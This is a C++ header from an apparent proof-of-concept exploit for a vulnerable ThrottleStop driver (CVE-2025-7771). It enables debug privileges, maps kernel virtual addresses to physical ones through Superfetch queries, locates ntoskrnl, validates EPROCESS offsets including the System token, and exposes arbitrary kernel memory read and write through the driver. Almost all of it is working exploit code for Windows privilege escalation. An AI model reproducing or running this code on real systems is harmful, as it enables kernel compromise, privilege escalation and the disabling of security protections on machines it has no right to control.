#pragma once

#ifndef _WIN64
#error "This PoC must be compiled as x64. Use the x64 Native Tools Command Prompt."
#endif

#include "driver.h"
#include "kernel.h"
#include <psapi.h>
#include <vector>
#include <unordered_map>
#include <string>
#include <algorithm>

struct KernelModule {
    ULONGLONG base;
    ULONG     size;
    char      name[256];
};

// Superfetch-based kernel memory explorer.
// Builds a complete VA->PA translation table from the PFN database, then uses
// simple table lookups for all address translation.  No CR3, no page-table
// walking, no physical-memory scanning — exactly matching the architecture of
// every known working ThrottleStop PoC.

class PhysMemExplorer {
    ThrottleStopDriver& m_drv;
    EprocessOffsets      m_off;

    ULONGLONG m_ntVA   = 0;
    ULONGLONG m_ntPA   = 0;
    ULONG     m_ntSize = 0;
    HMODULE   m_hNtLocal = NULL;

    std::vector<KernelModule> m_modules;
    fnNtQuerySystemInformation m_NtQSI = nullptr;

    struct SFRange { ULONGLONG basePfn; ULONGLONG pageCount; };
    std::vector<SFRange> m_sfRanges;

    // Page-aligned VA -> PA base.  Built once during Init().
    std::unordered_map<ULONGLONG, ULONGLONG> m_vtopTable;

public:
    PhysMemExplorer(ThrottleStopDriver& drv, const EprocessOffsets& off)
        : m_drv(drv), m_off(off) {}

    ~PhysMemExplorer() {
        if (m_hNtLocal) FreeLibrary(m_hNtLocal);
    }

    bool Init() {
        m_NtQSI = (fnNtQuerySystemInformation)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "NtQuerySystemInformation");
        if (!m_NtQSI) {
            printf("[-] Cannot resolve NtQuerySystemInformation\n");
            return false;
        }

        printf("[*] Phase 1: Acquiring privileges...\n");
        if (!AcquirePrivileges()) {
            printf("[-] Failed to acquire required privileges.\n");
            printf("    The driver opens without admin (CVE-2025-7771), but\n");
            printf("    Superfetch VA->PA translation requires admin privileges.\n");
            printf("    Run as Administrator for full exploit functionality.\n");
            return false;
        }
        printf("[+] Privileges acquired.\n");

        printf("[*] Phase 2: Resolving ntoskrnl base VA...\n");
        if (!FindNtoskrnlVA()) {
            printf("[-] Failed to resolve ntoskrnl base\n");
            return false;
        }
        printf("[+] ntoskrnl VA : 0x%llX  size: 0x%X\n", m_ntVA, m_ntSize);

        char ntPath[MAX_PATH];
        GetSystemDirectoryA(ntPath, MAX_PATH);
        strcat_s(ntPath, "\\ntoskrnl.exe");
        m_hNtLocal = LoadLibraryExA(ntPath, NULL, DONT_RESOLVE_DLL_REFERENCES);
        if (!m_hNtLocal) {
            printf("[-] Failed to load local ntoskrnl (%lu)\n", GetLastError());
            return false;
        }

        printf("[*] Phase 3: Building VA->PA translation table via Superfetch...\n");
        if (!BuildMemoryMap()) {
            printf("[-] Superfetch memory map build failed.\n");
            printf("    Ensure SysMain service is running:\n");
            printf("      sc query SysMain\n");
            printf("      sc start SysMain\n");
            return false;
        }
        printf("[+] Translation table: %zu page mappings\n", m_vtopTable.size());

        printf("[*] Phase 4: Resolving ntoskrnl physical address...\n");
        m_ntPA = Vtop(m_ntVA);
        if (!m_ntPA) {
            printf("[-] ntoskrnl VA not found in translation table.\n");
            printf("    Superfetch may not have mapped this page.\n");
            return false;
        }
        printf("[+] ntoskrnl PA : 0x%llX\n", m_ntPA);

        printf("[*] Phase 5: Validating EPROCESS offsets...\n");
        if (!ValidateOffsets()) {
            printf("[-] EPROCESS offset validation failed.\n");
            printf("    Your Windows build may use different offsets.\n");
            return false;
        }
        printf("[+] Offsets validated (PID 4 = System confirmed).\n");

        EnumModules();
        printf("[+] Enumerated %zu kernel modules\n", m_modules.size());
        printf("[+] Initialization complete.\n\n");
        return true;
    }

    // ==================== VA-to-PA (Superfetch table lookup) ====================
    ULONGLONG Vtop(ULONGLONG va) {
        ULONGLONG pageVA = va & ~0xFFFULL;
        auto it = m_vtopTable.find(pageVA);
        if (it != m_vtopTable.end())
            return it->second + (va & 0xFFF);

        // Fallback for large-page mappings (ntoskrnl uses 2MB pages).
        // Superfetch only reports VirtualAddress for the base PFN of each
        // large page, so individual 4KB PFNs within the region miss the table.
        // Since large-page regions are physically contiguous, PA = ntPA + RVA.
        if (m_ntVA && m_ntPA && va >= m_ntVA && va < m_ntVA + m_ntSize)
            return m_ntPA + (va - m_ntVA);

        return 0;
    }

    // For compatibility with exploits.h which calls VirtToPhys
    ULONGLONG VirtToPhys(ULONGLONG va) { return Vtop(va); }

    // ==================== Kernel virtual memory I/O ====================
    bool ReadVirtual(ULONGLONG va, void* buf, size_t size) {
        BYTE* p = (BYTE*)buf;
        size_t off = 0;
        while (off < size) {
            ULONGLONG curVA = va + off;
            ULONGLONG pa = Vtop(curVA);
            if (!pa) return false;
            size_t pageRem = 0x1000 - (curVA & 0xFFF);
            size_t chunk  = (std::min)(size - off, pageRem);
            if (!m_drv.ReadPhysBuffer(pa, p + off, chunk)) return false;
            off += chunk;
        }
        return true;
    }

    bool WriteVirtual(ULONGLONG va, const void* buf, size_t size) {
        const BYTE* p = (const BYTE*)buf;
        size_t off = 0;
        while (off < size) {
            ULONGLONG curVA = va + off;
            ULONGLONG pa = Vtop(curVA);
            if (!pa) return false;
            size_t pageRem = 0x1000 - (curVA & 0xFFF);
            size_t chunk  = (std::min)(size - off, pageRem);
            if (!m_drv.WritePhysBuffer(pa, p + off, chunk)) return false;
            off += chunk;
        }
        return true;
    }

    // ==================== Convenience helpers ====================
    ULONGLONG ReadVirt64(ULONGLONG va) {
        ULONGLONG v = 0; ReadVirtual(va, &v, 8); return v;
    }
    DWORD ReadVirt32(ULONGLONG va) {
        DWORD v = 0; ReadVirtual(va, &v, 4); return v;
    }
    BYTE ReadVirt8(ULONGLONG va) {
        BYTE v = 0; ReadVirtual(va, &v, 1); return v;
    }

    // ==================== Export resolution ====================
    ULONGLONG ResolveExport(const char* name) {
        FARPROC proc = GetProcAddress(m_hNtLocal, name);
        if (!proc) return 0;
        ULONGLONG rva = (ULONGLONG)proc - (ULONGLONG)m_hNtLocal;
        return m_ntVA + rva;
    }

    // ==================== Module lookup ====================
    const char* ModuleForAddress(ULONGLONG addr) {
        for (auto& m : m_modules)
            if (addr >= m.base && addr < m.base + m.size)
                return m.name;
        return "unknown";
    }

    const EprocessOffsets& Off() const { return m_off; }
    ULONGLONG NtoskrnlVA() const { return m_ntVA; }
    ULONGLONG NtoskrnlPA() const { return m_ntPA; }
    ThrottleStopDriver& Drv() { return m_drv; }

private:
    // ==================== Privilege acquisition ====================

    bool AcquirePrivileges() {
        typedef LONG(WINAPI* pfnRtlAdjustPrivilege)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
        auto RtlAdjustPrivilege = (pfnRtlAdjustPrivilege)GetProcAddress(
            GetModuleHandleA("ntdll.dll"), "RtlAdjustPrivilege");
        if (!RtlAdjustPrivilege) return false;

        BOOLEAN old = FALSE;
        LONG status = RtlAdjustPrivilege(SE_PROF_SINGLE_PROCESS_PRIVILEGE, TRUE, FALSE, &old);
        if (status != 0) {
            printf("    [-] SE_PROF_SINGLE_PROCESS_PRIVILEGE failed: 0x%08lX\n", status);
            return false;
        }
        status = RtlAdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE, &old);
        if (status != 0) {
            printf("    [-] SE_DEBUG_PRIVILEGE failed: 0x%08lX\n", status);
            return false;
        }
        return true;
    }

    // ==================== Superfetch query wrapper ====================

    LONG QuerySuperfetchInfo(SUPERFETCH_INFORMATION_CLASS infoClass,
                             PVOID buffer, ULONG length, PULONG retLength) {
        SUPERFETCH_INFORMATION sfInfo = {};
        sfInfo.Version  = SUPERFETCH_VERSION;
        sfInfo.Magic    = SUPERFETCH_MAGIC;
        sfInfo.InfoClass = infoClass;
        sfInfo.Data     = buffer;
        sfInfo.Length    = length;
        return m_NtQSI(SystemSuperfetchInformation, &sfInfo, sizeof(sfInfo), retLength);
    }

    // ==================== Memory range queries ====================

    bool QueryMemoryRanges() {
        m_sfRanges.clear();
        if (QueryMemoryRangesV1()) return true;
        return QueryMemoryRangesV2();
    }

    bool QueryMemoryRangesV1() {
        ULONG bufferLength = 0;
        PF_MEMORY_RANGE_INFO_V1 probe = {};
        probe.Version = 1;

        LONG status = QuerySuperfetchInfo(SuperfetchMemoryRangesQuery,
                                          &probe, sizeof(probe), &bufferLength);
        if (status != (LONG)0xC0000023L)
            return false;

        auto info = (PPF_MEMORY_RANGE_INFO_V1)HeapAlloc(
            GetProcessHeap(), HEAP_ZERO_MEMORY, bufferLength);
        if (!info) return false;

        info->Version = 1;
        status = QuerySuperfetchInfo(SuperfetchMemoryRangesQuery,
                                     info, bufferLength, NULL);
        if (status != 0) {
            HeapFree(GetProcessHeap(), 0, info);
            return false;
        }

        for (ULONG i = 0; i < info->RangeCount; i++)
            m_sfRanges.push_back({info->Ranges[i].BasePfn, info->Ranges[i].PageCount});

        HeapFree(GetProcessHeap(), 0, info);
        return !m_sfRanges.empty();
    }

    bool QueryMemoryRangesV2() {
        ULONG bufferLength = 0;
        PF_MEMORY_RANGE_INFO_V2 probe = {};
        probe.Version = 2;

        LONG status = QuerySuperfetchInfo(SuperfetchMemoryRangesQuery,
                                          &probe, sizeof(probe), &bufferLength);
        if (status != (LONG)0xC0000023L)
            return false;

        auto info = (PPF_MEMORY_RANGE_INFO_V2)HeapAlloc(
            GetProcessHeap(), HEAP_ZERO_MEMORY, bufferLength);
        if (!info) return false;

        info->Version = 2;
        status = QuerySuperfetchInfo(SuperfetchMemoryRangesQuery,
                                     info, bufferLength, NULL);
        if (status != 0) {
            HeapFree(GetProcessHeap(), 0, info);
            return false;
        }

        for (ULONG i = 0; i < info->RangeCount; i++)
            m_sfRanges.push_back({info->Ranges[i].BasePfn, info->Ranges[i].PageCount});

        HeapFree(GetProcessHeap(), 0, info);
        return !m_sfRanges.empty();
    }

    // ==================== Build VA->PA translation table ====================

    bool BuildMemoryMap() {
        if (!QueryMemoryRanges()) {
            printf("    [-] Failed to query memory ranges.\n");
            return false;
        }

        ULONGLONG totalPages = 0;
        for (auto& r : m_sfRanges) totalPages += r.pageCount;
        printf("    [+] %zu physical ranges, %llu total pages (%.1f GB)\n",
               m_sfRanges.size(), totalPages,
               (double)(totalPages << 12) / (1024.0 * 1024.0 * 1024.0));

        m_vtopTable.clear();
        m_vtopTable.reserve(totalPages / 2);

        for (size_t ri = 0; ri < m_sfRanges.size(); ri++) {
            auto& range = m_sfRanges[ri];

            size_t bufferLength = sizeof(PF_PFN_PRIO_REQUEST) +
                                  sizeof(MMPFN_IDENTITY) * range.pageCount;

            auto request = (PPF_PFN_PRIO_REQUEST)HeapAlloc(
                GetProcessHeap(), HEAP_ZERO_MEMORY, bufferLength);
            if (!request) {
                printf("    [-] HeapAlloc failed for range %zu (%llu pages, %zu bytes)\n",
                       ri, range.pageCount, bufferLength);
                return false;
            }

            request->Version      = 1;
            request->RequestFlags = 1;
            request->PfnCount     = (ULONG_PTR)range.pageCount;

            for (ULONGLONG i = 0; i < range.pageCount; i++)
                request->PageData[i].PageFrameIndex = (ULONG_PTR)(range.basePfn + i);

            LONG status = QuerySuperfetchInfo(SuperfetchPfnQuery,
                                              request, (ULONG)bufferLength, NULL);
            if (status != 0) {
                HeapFree(GetProcessHeap(), 0, request);
                printf("    [-] PFN query failed for range %zu (PFN 0x%llX, %llu pages): 0x%08lX\n",
                       ri, range.basePfn, range.pageCount, status);
                return false;
            }

            for (ULONGLONG i = 0; i < range.pageCount; i++) {
                ULONGLONG va = (ULONGLONG)request->PageData[i].u2.VirtualAddress;
                if (va) {
                    va &= ~0xFFFULL;
                    ULONGLONG pa = (range.basePfn + i) << 12;
                    m_vtopTable[va] = pa;
                }
            }

            HeapFree(GetProcessHeap(), 0, request);

            if (m_sfRanges.size() > 1)
                printf("    [*] Range %zu/%zu processed (%llu pages)\r",
                       ri + 1, m_sfRanges.size(), range.pageCount);
        }

        if (m_sfRanges.size() > 1) printf("\n");
        return !m_vtopTable.empty();
    }

    // ==================== ntoskrnl VA discovery ====================

    bool FindNtoskrnlVA() {
        if (!m_NtQSI) return false;

        ULONG needed = 0;
        m_NtQSI(SystemModuleInformation, NULL, 0, &needed);
        if (!needed) return false;

        auto buf = (PRTL_PROCESS_MODULES)HeapAlloc(
            GetProcessHeap(), HEAP_ZERO_MEMORY, needed);
        if (!buf) return false;

        bool ok = false;
        if (m_NtQSI(SystemModuleInformation, buf, needed, &needed) == 0
            && buf->NumberOfModules > 0) {
            m_ntVA   = (ULONGLONG)buf->Modules[0].ImageBase;
            m_ntSize = buf->Modules[0].ImageSize;
            ok = (m_ntVA >> 32) != 0;
        }
        HeapFree(GetProcessHeap(), 0, buf);
        return ok;
    }

    // ==================== EPROCESS offset validation ====================

    bool ValidateOffsets() {
        // ntoskrnl is mapped with 2MB large pages -> physically contiguous.
        // Read PsInitialSystemProcess directly via physical address.
        ULONGLONG pISP_rva = (ULONGLONG)GetProcAddress(m_hNtLocal,
            "PsInitialSystemProcess") - (ULONGLONG)m_hNtLocal;
        ULONGLONG pISP_PA = m_ntPA + pISP_rva;

        ULONGLONG systemEproc = 0;
        if (!m_drv.ReadPhys64(pISP_PA, &systemEproc) || !systemEproc) {
            printf("    [-] Failed to read PsInitialSystemProcess\n");
            return false;
        }
        printf("    [+] System EPROCESS VA: 0x%llX\n", systemEproc);

        ULONGLONG pid = ReadVirt64(systemEproc + m_off.UniqueProcessId);
        if ((DWORD)pid != 4) {
            printf("    [-] System PID at offset 0x%X = %llu (expected 4)\n",
                   m_off.UniqueProcessId, pid);
            return false;
        }

        char name[16] = {};
        ReadVirtual(systemEproc + m_off.ImageFileName, name, 15);
        if (_stricmp(name, "System") != 0) {
            printf("    [-] System ImageFileName at offset 0x%X = '%s' (expected 'System')\n",
                   m_off.ImageFileName, name);
            return false;
        }

        ULONGLONG token = ReadVirt64(systemEproc + m_off.Token);
        ULONGLONG tokenAddr = token & ~0xFULL;
        if ((tokenAddr >> 44) == 0 || (tokenAddr >> 44) > 0xFFFFF) {
            printf("    [-] System Token at offset 0x%X = 0x%llX (doesn't look like kernel ptr)\n",
                   m_off.Token, token);
            return false;
        }

        return true;
    }

    // ==================== Module enumeration ====================

    void EnumModules() {
        m_modules.clear();
        if (!m_NtQSI) return;

        ULONG needed = 0;
        m_NtQSI(SystemModuleInformation, NULL, 0, &needed);
        if (!needed) return;

        auto buf = (PRTL_PROCESS_MODULES)HeapAlloc(
            GetProcessHeap(), HEAP_ZERO_MEMORY, needed);
        if (!buf) return;

        if (m_NtQSI(SystemModuleInformation, buf, needed, &needed) == 0) {
            for (ULONG i = 0; i < buf->NumberOfModules; i++) {
                KernelModule km;
                km.base = (ULONGLONG)buf->Modules[i].ImageBase;
                km.size = buf->Modules[i].ImageSize;
                const char* full = (const char*)buf->Modules[i].FullPathName;
                const char* slash = strrchr(full, '\\');
                strncpy_s(km.name, slash ? slash + 1 : full, _TRUNCATE);
                m_modules.push_back(km);
            }
        }
        HeapFree(GetProcessHeap(), 0, buf);
    }
};
